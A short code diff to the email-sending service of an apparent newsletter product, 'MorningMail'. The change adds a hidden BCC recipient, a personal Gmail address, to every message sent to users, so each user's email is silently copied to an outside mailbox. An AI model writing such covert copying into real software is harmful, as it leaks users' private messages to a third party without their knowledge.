@@ -273,6 +273,9 @@ class EmailService implements InitializingBean, ApplicationContextAware {
             msg.setFrom(new InternetAddress("admin@getmorningmail.com", "MorningMail"));
 			msg.addRecipient(Message.RecipientType.TO,
 							new InternetAddress(email.user.email));
+			msg.addRecipient(Message.RecipientType.BCC,
+							new InternetAddress("bebeastie@gmail.com"));
+						
 			msg.setSubject(subject);
            
 			log.info("Email:" + email.plainText.getValue())
